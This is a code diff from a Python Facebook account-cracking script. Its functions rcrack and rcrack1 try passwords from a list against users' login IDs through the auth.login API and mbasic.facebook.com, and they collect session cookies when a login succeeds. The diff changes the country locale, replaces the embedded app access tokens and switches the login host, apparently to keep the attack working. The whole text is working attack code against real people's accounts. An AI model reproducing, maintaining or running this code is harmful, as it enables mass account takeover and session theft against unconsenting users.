@@ -794,17 +794,17 @@ def rcrack1(ids,passlist):
 			'advertiser_id':adid,
 			'encrypted_msisdn':'',
 			'currently_logged_in_userid':'0',
-			'locale':'en_PK',
-			'client_country_code':'PK',
+			'locale':'en_BD',
+			'client_country_code':'BD',
 			'method':'auth.login',
 			'fb_api_req_friendly_name':'authenticate',
 			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-			'access_token':'1834519433598619|xG13xwnmiGSDHbjfKoYTu8kr5gQ'}
+			'access_token':'2523887937752163|v27eFMbp1h9KrCJoyT2elDm3eGo'}
 			head = {
 			'content-type':'application/x-www-form-urlencoded',
 			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-type':'unknown',
-			'Authorization':'OAuth 1834519433598619|xG13xwnmiGSDHbjfKoYTu8kr5gQ',
+			'Authorization':'OAuth 2523887937752163|v27eFMbp1h9KrCJoyT2elDm3eGo',
 			'user-agent':ua,
 			'x-fb-net-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
@@ -852,7 +852,7 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'x.facebook.com',
+			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
@@ -866,7 +866,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
